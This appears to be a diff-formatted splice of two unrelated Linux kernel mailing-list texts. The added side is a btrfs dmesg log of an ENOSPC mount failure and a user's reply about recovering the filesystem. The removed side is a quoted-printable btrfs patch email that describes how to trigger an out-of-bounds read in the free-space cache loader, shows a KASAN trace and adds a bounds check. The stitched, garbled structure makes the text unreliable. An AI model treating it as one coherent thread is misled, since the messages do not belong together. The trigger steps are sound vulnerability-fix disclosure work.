+[117261.816785] BTRFS info (device sdb3): block group 55856594944 has 1073741824 bytes, 1007976448 used 0 pinned 0 reserved 0 delalloc 0 super 0 zone_unusable (65765376
+  bytes available) [readonly]
+[117261.834327] BTRFS info (device sdb3): block group has cluster?: no
+[117261.840947] BTRFS info (device sdb3): 0 free space entries at or bigger than 16384 bytes
+[117261.849500] BTRFS info (device sdb3): block group 101368987648 has 1073741824 bytes, 500957184 used 0 pinned 0 reserved 0 delalloc 0 super 0 zone_unusable (57278464
+0 bytes available) [readonly]
+[117261.867163] BTRFS info (device sdb3): block group has cluster?: no
+[117261.873784] BTRFS info (device sdb3): 0 free space entries at or bigger than 16384 bytes                                                                            [117261.882313] BTRFS info (device sdb3): block group 102442729472 has 1073741824 bytes, 633536512 used 0 pinned 0 reserved 0 delalloc 0 super 0 zone_unusable (44020531
+2 bytes available) [readonly]
+[117261.899994] BTRFS info (device sdb3): block group has cluster?: no
+[117261.906630] BTRFS info (device sdb3): 0 free space entries at or bigger than 16384 bytes
+[117261.915176] BTRFS info (device sdb3): 1078755328 bytes available across all block groups
+[117261.923750] BTRFS warning (device sdb3): Skipping commit of aborted transaction.
+[117261.931608] ------------[ cut here ]------------
+[117261.936687] BTRFS: Transaction aborted (error -28)
+[117261.941950] WARNING: fs/btrfs/transaction.c:2060 at btrfs_commit_transaction+0xaaa/0xe20 [btrfs], CPU#6: mount/2008
+[117261.952905] Modules linked in: ntfs3 btrfs libblake2b raid10 raid456 async_raid6_recov async_memcpy async_pq async_xor async_tx xor raid6_pq raid1 raid0 md_mod auto
+fs4 hid_logitech_hidpp hid_logitech_dj hid_generic usbhid hid sr_mod cdrom uas usb_storage i915 drm_buddy ttm i2c_algo_bit drm_display_helper cec sd_mod rc_core drm_cli
+ent_lib drm_kms_helper iTCO_wdt xhci_pci ahci intel_pmc_bxt drm libahci watchdog xhci_hcd firewire_ohci libata firewire_core r8169 video realtek crc_itu_t usbcore scsi_
+mod fan i2c_i801 wmi button usb_common i2c_smbus scsi_common efivarfs
+[117262.004021] CPU: 6 UID: 0 PID: 2008 Comm: mount Tainted: G        W           7.0.10+deb14-amd64 #1 PREEMPT(lazy)  Debian 7.0.10-1
+[117262.016343] Tainted: [W]=WARN
+[117262.019853] Hardware name: LENOVO 10M8S14C42/3102, BIOS M16KT71A 09/14/2023
+[117262.027348] RIP: 0010:btrfs_commit_transaction+0xaac/0xe20 [btrfs]
+[117262.034117] Code: ff 48 8b 7c 24 08 31 c9 48 8d b7 48 01 00 00 e8 9a 7c 0b 00 48 c7 43 18 00 00 00 00 e9 73 fe ff ff 48 8d 3d 66 fd 34 00 89 ee <67> 48 0f b9 3a e9
+f8 fe ff ff 49 8b bc 24 48 03 00 00 be 02 00 00
+[117262.053426] RSP: 0018:ffffce9fc8b57418 EFLAGS: 00010292
+[117262.059233] RAX: 0000000000000002 RBX: ffff8ac4d181a738 RCX: 0000000000000003
+[117262.066946] RDX: 0000000002040001 RSI: 00000000ffffffe4 RDI: ffffffffc1028080
+[117262.074658] RBP: 00000000ffffffe4 R08: 0000000000000000 R09: ffffce9fc8b57200
+[117262.082364] R10: ffff8acbe23fff90 R11: 00000000fff7ffff R12: ffff8ac545885000
+[117262.090075] R13: ffff8ac4c242ea00 R14: ffff8ac5458854c0 R15: ffff8ac4cff01b80
+[117262.097779] FS:  00007f22c28cf940(0000) GS:ffff8acc3a4fc000(0000) knlGS:0000000000000000
+[117262.106429] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[117262.112740] CR2: 00007f22c2cdfdd0 CR3: 00000001867ac001 CR4: 00000000003706f0
+[117262.120434] Call Trace:
+[117262.123451]  <TASK>
+[117262.126121]  ? start_transaction+0x228/0x880 [btrfs]
+[117262.131676]  flush_space+0x3c3/0x5a0 [btrfs]
+[117262.136574]  ? btrfs_reduce_alloc_profile+0x5a/0x1d0 [btrfs]
+[117262.142855]  ? calc_available_free_space.isra.0+0x70/0xc0 [btrfs]
+[117262.149597]  priority_reclaim_metadata_space+0x96/0x130 [btrfs]
+[117262.156132]  handle_reserve_ticket+0x5b/0x290 [btrfs]
+[117262.161800]  ? btrfs_reduce_alloc_profile+0x5a/0x1d0 [btrfs]
+[117262.168076]  reserve_bytes+0x268/0x4c0 [btrfs]                                                                                                                      [117262.173127]  btrfs_reserve_metadata_bytes+0x1a/0xe0 [btrfs]
+[117262.179306]  btrfs_block_rsv_refill+0x60/0x90 [btrfs]
+[117262.184965]  evict_refill_and_join+0x47/0xe0 [btrfs]
+[117262.190531]  btrfs_evict_inode+0x332/0x400 [btrfs]
+[117262.195922]  evict+0xfd/0x270
+[117262.199441]  btrfs_orphan_cleanup+0x21f/0x390 [btrfs]
+[117262.205085]  btrfs_start_pre_rw_mount+0x2a0/0x6c0 [btrfs]
+[117262.211071]  open_ctree+0x12fb/0x1730 [btrfs]
+[117262.216028]  btrfs_get_tree.cold+0xb/0xb6 [btrfs]
+[117262.221324]  ? security_inode_permission+0x4a/0x110
+[117262.226747]  vfs_get_tree+0x29/0xd0
+[117262.230776]  vfs_cmd_create+0x57/0xd0
+[117262.234947]  __do_sys_fsconfig+0x2fc/0x5e0
+[117262.239581]  do_syscall_64+0xcd/0x15f0
+[117262.243873]  ? __fs_parse+0x68/0x1c0
+[117262.247989]  ? aa_file_perm+0x18a/0x550
+[117262.252368]  ? btrfs_parse_param+0x4f/0x960 [btrfs]
+[117262.257818]  ? apparmor_file_permission+0x44/0xb0
+[117262.263052]  ? fscontext_read+0x171/0x190
+[117262.267594]  ? rw_verify_area+0x56/0x180
+[117262.272039]  ? vfs_read+0xbf/0x390
+[117262.275964]  ? __fs_parse+0x68/0x1c0
+[117262.280063]  ? aa_file_perm+0x18a/0x550
+[117262.284422]  ? btrfs_parse_param+0x4f/0x960 [btrfs]
+[117262.289858]  ? apparmor_file_permission+0x44/0xb0
+[117262.295082]  ? fscontext_read+0x171/0x190
+[117262.299605]  ? rw_verify_area+0x56/0x180
+[117262.304036]  ? vfs_read+0xbf/0x390
+[117262.307943]  ? do_syscall_64+0x10a/0x15f0
+[117262.312451]  ? from_kgid_munged+0x17/0x30
+[117262.316955]  ? __do_sys_getgid+0x27/0x30
+[117262.321369]  ? do_syscall_64+0x10a/0x15f0
+[117262.325856]  ? from_kgid_munged+0x17/0x30
+[117262.330340]  ? ksys_read+0x73/0xf0
+[117262.334213]  ? do_syscall_64+0x10a/0x15f0
+[117262.338694]  ? irqentry_exit+0x78/0x680
+[117262.343000]  ? exc_page_fault+0x82/0x1d0
+[117262.347384]  ? __irq_exit_rcu+0x3d/0xe0                                                                                                                             [117262.351683]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
+[117262.357197] RIP: 0033:0x7f22c2d0eb4a
+[117262.361218] Code: 73 01 c3 48 8b 0d c6 32 0d 00 f7 d8 64 89 01 48 83 c8 ff c3 66 2e 0f 1f 84 00 00 00 00 00 66 90 49 89 ca b8 af 01 00 00 0f 05 <48> 3d 01 f0 ff ff
+73 01 c3 48 8b 0d 96 32 0d 00 f7 d8 64 89 01 48
+[117262.380431] RSP: 002b:00007ffd5d547f68 EFLAGS: 00000246 ORIG_RAX: 00000000000001af
+[117262.388464] RAX: ffffffffffffffda RBX: 0000557471e4da50 RCX: 00007f22c2d0eb4a
+[117262.396057] RDX: 0000000000000000 RSI: 0000000000000006 RDI: 0000000000000003
+[117262.403650] RBP: 0000000000000003 R08: 0000000000000000 R09: 0000000000000000
+[117262.411240] R10: 0000000000000000 R11: 0000000000000246 R12: 0000557471e4ec40
+[117262.418831] R13: 00007f22c2ea127c R14: 00007f22c2e9f460 R15: 00007f22c28cf7f0
+[117262.426410]  </TASK>
+[117262.429024] ---[ end trace 0000000000000000 ]---
+[117262.434074] BTRFS info (device sdb3 state A): dumping space info:
+[117262.440595] BTRFS info (device sdb3 state A): space_info DATA (sub-group id 0) has 17422925824 free, is not full
+[117262.451184] BTRFS info (device sdb3 state A): space_info total=70262980608, used=52839989248, pinned=0, reserved=0, may_use=0, readonly=65536 zone_unusable=0
+[117262.465659] BTRFS info (device sdb3 state A): space_info METADATA (sub-group id 0) has -190382080 free, is full
+[117262.476171] BTRFS info (device sdb3 state A): space_info total=3221225472, used=2142470144, pinned=0, reserved=0, may_use=190382080, readonly=1078755328 zone_unusable=0
+[117262.491598] BTRFS info (device sdb3 state A): space_info SYSTEM (sub-group id 0) has 0 free, is not full
+[117262.501477] BTRFS info (device sdb3 state A): space_info total=33554432, used=16384, pinned=0, reserved=0, may_use=0, readonly=33538048 zone_unusable=0
+[117262.515439] BTRFS info (device sdb3 state A): global_block_rsv: size 190382080 reserved 190382080
+[117262.524731] BTRFS info (device sdb3 state A): trans_block_rsv: size 0 reserved 0
+[117262.532538] BTRFS info (device sdb3 state A): chunk_block_rsv: size 0 reserved 0
+[117262.540337] BTRFS info (device sdb3 state A): remap_block_rsv: size 0 reserved 0
+[117262.548136] BTRFS info (device sdb3 state A): delayed_block_rsv: size 0 reserved 0
+[117262.556110] BTRFS info (device sdb3 state A): delayed_refs_rsv: size 0 reserved 0
+[117262.563998] BTRFS: error (device sdb3 state A) in cleanup_transaction:2060: errno=-28 No space left
+[117262.573453] BTRFS info (device sdb3 state EA): space_info METADATA (sub-group id 0) has -190382080 free, is full
+[117262.584033] BTRFS info (device sdb3 state EA): space_info total=3221225472, used=2142470144, pinned=0, reserved=0, may_use=190382080, readonly=1078755328 zone_unusable=0
+[117262.599563] BTRFS info (device sdb3 state EA): global_block_rsv: size 190382080 reserved 190382080
+[117262.608943] BTRFS info (device sdb3 state EA): trans_block_rsv: size 0 reserved 0
+[117262.616846] BTRFS info (device sdb3 state EA): chunk_block_rsv: size 0 reserved 0
+[117262.624749] BTRFS info (device sdb3 state EA): remap_block_rsv: size 0 reserved 0
+[117262.632643] BTRFS info (device sdb3 state EA): delayed_block_rsv: size 0 reserved 0
+[117262.640715] BTRFS info (device sdb3 state EA): delayed_refs_rsv: size 0 reserved 0
+[117262.648696] BTRFS info (device sdb3 state EA): space_info METADATA (sub-group id 0) has -190382080 free, is full
+[117262.659312] BTRFS info (device sdb3 state EA): space_info total=3221225472, used=2142470144, pinned=0, reserved=0, may_use=190382080, readonly=1078755328 zone_unusable=0
+[117262.674875] BTRFS info (device sdb3 state EA): global_block_rsv: size 190382080 reserved 190382080
+[117262.684287] BTRFS info (device sdb3 state EA): trans_block_rsv: size 0 reserved 0
+[117262.692225] BTRFS info (device sdb3 state EA): chunk_block_rsv: size 0 reserved 0
+[117262.700155] BTRFS info (device sdb3 state EA): remap_block_rsv: size 0 reserved 0
+[117262.708086] BTRFS info (device sdb3 state EA): delayed_block_rsv: size 0 reserved 0
+[117262.716191] BTRFS info (device sdb3 state EA): delayed_refs_rsv: size 0 reserved 0
+[117262.724260] BTRFS warning (device sdb3 state EA): could not allocate space for delete; will truncate on mount
+[117262.734622] BTRFS error (device sdb3 state EA): Error removing orphan entry, stopping orphan cleanup
+[117262.744220] BTRFS error (device sdb3 state EA): could not do orphan cleanup -28
+[117262.752021] BTRFS error (device sdb3 state EA): commit super block returned -30
+[117262.760739] BTRFS error (device sdb3 state EA): open_ctree failed: -28
+mount: /var: fsconfig() failed: No space left on device.
+        dmesg(1) may have more information after failed mount system call.
+
+
+
+
+> If the first command works but the second command does not, you could insert a `btrfs device add` command to add a partition. I'm not such a big fan of adding USB sticks or zram devices because if anything goes wrong, the file system ends up broken.
 >
-> The load loops num_entries times and maps the next page whenever the curr=
-ent
-> one runs out, going through io_ctl_check_crc() -> io_ctl_map_page(), whic=
-h
-> does io_ctl->pages[io_ctl->index++]. But pages[] is allocated in
-> io_ctl_init() from the cache inode's i_size, not from num_entries:
+> This is a bit of a heavy hammer to fix this problem but it might actually be faster than troubleshooting Btrfs enospc:
+
+I am all for troubleshooting this enospc issue because it is the first 
+time I cannot even add a device to fix the enospc... in fact an hour 
+before this issue I had an enospc issue this time with the root 
+partition that had very few space left, and adding a device worked well 
+and it was pretty easy to fix. But here I have gigabytes of unused data 
+and metadata, I am puzzled.
+
+I was switching my SSD btrfs partitions (I plan to merge them all but 
+for historical reason they are split as separate btrfs partitions 
+instead of subvolumes of a single btrfs partition) from single to DUP, 
+the new default.
+
+
+
+  I believe the main issue here is that the conversion attempted to use 
+until the last megabyte of metadata before errorring out, preventing any 
+simple rescue operation afterwards, and even preventing from balancing 
+data to free chunks for metadata.
+
+It would have been fine for the conversion to error out and let me 
+balance data then resume the conversion. The main issue is that the 
+conversion used so much metadata space that I cannot even mount the 
+btrfs partition to balance its data space.
+
+Maybe the metadata conversion should guard/ straight error out when 
+there is not enough space in metadata (here 3GB to duplicate 1,59GB does 
+not fit) and there is no way to get a new free chunk for metadata and 
+tell to free chunks first ?
+
+
+> It should still be possible to make the troubled Btrfs a read-only seed device using btrfs-tune; then mount it ro; use `btrfs dev add` using a device that's equal to or bigger; remount rw; then `btrfs dev rem` the 1st device, i.e. the ro seed. This will replicate/clone the file system from device 1 to device 2. And it'll take a while. But in the end you'll have a balanced file system on device 2.
 >
->         num_pages =3D DIV_ROUND_UP(i_size_read(inode), PAGE_SIZE);
->         io_ctl->pages =3D kcalloc(num_pages, sizeof(struct page *), GFP_N=
-OFS);
+> It isn't strictly necessary for device 2 to be equal to or bigger. It is possible to add a smaller device, but before you remove the 1st device, you wlil need to delete files. The bigger files you choose to delete, the fewer you will need to delete to get to the underprovisioned 2nd device size. Then remove the 1st device. Now only the files that have not been deleted will have extents replicated to the 2nd device.
 >
-> So if num_entries claims more records than the pages can hold, io_ctl->in=
-dex
-> runs off the end of pages[]. The write side never hits this because
-> io_ctl_add_entry() and io_ctl_add_bitmap() both stop once
-> io_ctl->index >=3D io_ctl->num_pages; the read side just never had the sa=
-me
-> check.
->
-> To trigger it, take a clean cache (num_entries =3D <N> here), set num_ent=
-ries
-> in the header to 0x10000, and fix up the leaf checksum so it still passes
-> the tree-checker. The cache inode has i_size =3D 65536, so num_pages is 1=
-6 and
-> pages[] is a 16-pointer (kmalloc-128) array. The load now tries to read
-> 65536 entries, io_ctl->index walks up to 16, and pages[16] is read past t=
-he
-> array:
->
->   BUG: KASAN: slab-out-of-bounds in io_ctl_check_crc (fs/btrfs/free-space=
--cache.c:420 fs/btrfs/free-space-cache.c:565)
->   Read of size 8 at addr ffff88800c833a80 by task kworker/u8:3/58
->    io_ctl_check_crc (fs/btrfs/free-space-cache.c:420 fs/btrfs/free-space-=
-cache.c:565)
->    __load_free_space_cache (fs/btrfs/free-space-cache.c:655 fs/btrfs/free=
--space-cache.c:820)
->    load_free_space_cache (fs/btrfs/free-space-cache.c:1017)
->    caching_thread (fs/btrfs/block-group.c:880)
->    btrfs_work_helper (fs/btrfs/async-thread.c:312)
->    process_one_work
->    worker_thread
->    kthread
->    ret_from_fork
->
-> free-space-cache.c:420 is io_ctl_map_page(), inlined into io_ctl_check_cr=
-c()
-> at line 565, which is why that is the frame KASAN names. The out-of-bound=
-s
-> slot is then treated as a struct page and handed to crc32c(), so the bad
-> read turns into a GP fault.
->
-> Add the missing check to io_ctl_check_crc(), which is where both the entr=
-y
-> loop and the bitmap loop end up. When num_entries is too large the load n=
-ow
-> fails like any corrupt cache: __load_free_space_cache() drops it and rebu=
-ilds
-> the free space from the extent tree, so a valid cache is never rejected.
->
-> Fixes: 5b0e95bf607d ("Btrfs: inline checksums into the disk free space ca=
-che")
-> Reported-by: Weiming Shi <bestswngs@gmail.com>
-> Assisted-by: Claude:claude-opus-4-8
-> Signed-off-by: Xiang Mei <xmei5@asu.edu>
-> ---
-> v2: add more details in the commit message
->
->  fs/btrfs/free-space-cache.c | 3 +++
->  1 file changed, 3 insertions(+)
->
-> diff --git a/fs/btrfs/free-space-cache.c b/fs/btrfs/free-space-cache.c
-> index ab22e4f9ffdd..bbc4db7fe74b 100644
-> --- a/fs/btrfs/free-space-cache.c
-> +++ b/fs/btrfs/free-space-cache.c
-> @@ -555,6 +555,9 @@ static int io_ctl_check_crc(struct btrfs_io_ctl *io_c=
-tl, int index)
->         u32 crc =3D ~(u32)0;
->         unsigned offset =3D 0;
->
-> +       if (index >=3D io_ctl->num_pages)
-> +               return -EIO;
-> +
->         if (index =3D=3D 0)
->                 offset =3D sizeof(u32) * io_ctl->num_pages;
->
-> --
-> 2.43.0
->
+> At the very least the seed-device is not being modified and shouldn't get any worse than it is.
+> Chris Murphy
+
+
+I don't know yet how to proceed with such a read-only seed option, I 
+will look into it. But is there other flags or tune I could do that 
+could let me cancel the pause operation, the balance the data space, 
+then retry the conversion ?
+
+
+Alban
+
